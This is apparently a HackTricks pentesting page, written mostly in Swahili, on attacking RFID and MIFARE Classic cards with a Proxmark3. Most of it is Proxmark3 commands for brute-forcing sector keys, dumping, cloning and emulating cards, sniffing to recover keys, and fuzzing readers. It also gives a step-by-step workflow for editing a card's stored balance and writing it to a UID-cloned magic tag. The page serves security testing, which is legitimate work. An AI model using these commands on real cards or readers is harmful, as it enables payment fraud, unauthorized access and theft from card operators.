# Proxmark 3

{{#include ../../banners/hacktricks-training.md}}

## Attacking RFID Systems with Proxmark3

Sakinisha Proxmark3 client ya RRG/Iceman inayodumishwa kikamilifu pamoja na firmware inayolingana, kisha thibitisha command syntax kwa kutumia build hiyo kwa sababu commands za zamani zilizoonyeshwa hapa chini huenda zimebadilika.<sup>[[1]](#references)[[5]](#references)</sup>

### Attacking MIFARE Classic 1KB

MIFARE Classic 1K ina **sectors 16**, kila moja ikiwa na **blocks 4** za **bytes 16**. Manufacturer block 0 ina data ya UID/manufacturer na ni read-only kwenye NXP cards halisi; clone au “magic” cards maalum zinaweza kuruhusu kuandikwa upya.<sup>[[1]](#references)[[2]](#references)</sup>\
Ili kufikia kila sector unahitaji **keys 2** (**A** na **B**) ambazo zimehifadhiwa kwenye **block 3 ya kila sector** (sector trailer). Sector trailer pia huhifadhi **access bits** zinazotoa ruhusa za **read na write** kwenye **kila block** kwa kutumia keys hizo 2.\
Keys 2 zinafaa kutoa ruhusa ya read ikiwa unajua ya kwanza, na write ikiwa unajua ya pili (kwa mfano).

Several attacks can be performed
```bash
proxmark3> hf mf #List attacks

proxmark3> hf mf chk *1 ? t ./client/default_keys.dic #Keys bruteforce
proxmark3> hf mf fchk 1 t # Improved keys BF

proxmark3> hf mf rdbl 0 A FFFFFFFFFFFF # Read block 0 with the key
proxmark3> hf mf rdsc 0 A FFFFFFFFFFFF # Read sector 0 with the key

proxmark3> hf mf dump 1 # Dump the information of the card (using creds inside dumpkeys.bin)
proxmark3> hf mf restore # Copy data to a new card
proxmark3> hf mf eload hf-mf-B46F6F79-data # Simulate card using dump
proxmark3> hf mf sim *1 u 8c61b5b4 # Simulate card using memory

proxmark3> hf mf eset 01 000102030405060708090a0b0c0d0e0f # Write those bytes to block 1
proxmark3> hf mf eget 01 # Read block 1
proxmark3> hf mf wrbl 01 B FFFFFFFFFFFF 000102030405060708090a0b0c0d0e0f # Write to the card
```
Proxmark3 inaruhusu kufanya vitendo vingine kama **eavesdropping** ya **Tag to Reader communication** ili kujaribu kupata data nyeti. Katika card hii unaweza kunusa tu mawasiliano na kukokotoa key iliyotumika kwa sababu **cryptographic operations zinazotumika ni dhaifu**, na ukijua plain na cipher text unaweza kuikokotoa (`mfkey64` tool).<sup>[[3]](#references)</sup>

#### MiFare Classic: workflow ya haraka ya stored-value abuse

Wakati terminals zinahifadhi salio kwenye Classic cards, mtiririko wa kawaida wa end-to-end ni:<sup>[[4]](#references)</sup>
```bash
# 1) Recover sector keys and dump full card
proxmark3> hf mf autopwn

# 2) Modify dump offline (adjust balance + integrity bytes)
#    Use diffing of before/after top-up dumps to locate fields

# 3) Write modified dump to a UID-changeable ("Chinese magic") tag
proxmark3> hf mf cload -f modified.bin

# 4) Clone original UID so readers recognize the card
proxmark3> hf mf csetuid -u <original_uid>
```
Vidokezo

- `hf mf autopwn` huratibu mashambulizi ya nested/darkside/HardNested-style, hurejesha keys, na huunda dumps katika folda ya client dumps.<sup>[[1]](#references)</sup>
- Kuandika block 0/UID hufanya kazi tu kwenye cards za magic gen1a/gen2. Cards za kawaida za Classic zina UID ya kusoma pekee.<sup>[[2]](#references)</sup>
- Deployments nyingi hutumia "value blocks" za Classic au checksums rahisi. Hakikisha sehemu zote zilizorudiwa/complemented na checksums zinaendana baada ya kuhariri.<sup>[[4]](#references)</sup>

Angalia methodology ya kiwango cha juu na mitigations katika:

{{#ref}}
pentesting-rfid.md
{{#endref}}

### Amri Ghafi

Mifumo ya IoT wakati mwingine hutumia **tags zisizo na brand au zisizo za kibiashara**. Katika hali hii, unaweza kutumia Proxmark3 kutuma **raw commands kwa tags**.
```bash
proxmark3> hf search UID : 80 55 4b 6c ATQA : 00 04
SAK : 08 [2]
TYPE : NXP MIFARE CLASSIC 1k | Plus 2k SL1
proprietary non iso14443-4 card found, RATS not supported
No chinese magic backdoor command detected
Prng detection: WEAK
Valid ISO14443A Tag Found - Quitting Search
```
Kwa taarifa hii unaweza kujaribu kutafuta maelezo kuhusu kadi hiyo na jinsi ya kuwasiliana nayo. Proxmark3 inaruhusu kutuma raw commands kama vile: `hf 14a raw -p -b 7 26`

### Scripts

Software ya Proxmark3 huja na orodha iliyopakiwa awali ya **automation scripts** unazoweza kutumia kutekeleza tasks rahisi. Ili kupata orodha kamili, tumia command ya `script list`. Kisha, tumia command ya `script run`, ikifuatiwa na jina la script:
```
proxmark3> script run mfkeys
```
Unaweza kuunda script ya **kufuzz tag readers**, hivyo ukinakili data ya **kadi halali**, andika tu **Lua script** ambayo **inarandomize** **bytes** moja au zaidi za nasibu na uangalie ikiwa **reader ina-crash** katika iteration yoyote.

## References

- [1] [Wiki ya Proxmark3: HF MIFARE](https://github.com/RfidResearchGroup/proxmark3/wiki/HF-Mifare)
- [2] [Wiki ya Proxmark3: Kadi za HF Magic](https://github.com/RfidResearchGroup/proxmark3/wiki/HF-Magic-cards)
- [3] [Taarifa ya NXP kuhusu MIFARE Classic Crypto1](https://www.mifare.net/en/products/chip-card-ics/mifare-classic/security-statement-on-crypto1-implementations/)
- [4] [Unyonyaji wa udhaifu wa kadi ya NFC katika KioSoft Stored Value (SEC Consult)](https://sec-consult.com/vulnerability-lab/advisory/nfc-card-vulnerability-exploitation-leading-to-free-top-up-kiosoft-payment-solution/)
- [5] [Proxmark3 ya RRG/Iceman — Usakinishaji wa Linux](https://github.com/RfidResearchGroup/proxmark3/blob/master/doc/md/Installation_Instructions/Linux-Installation-Instructions.md)
{{#include ../../banners/hacktricks-training.md}}
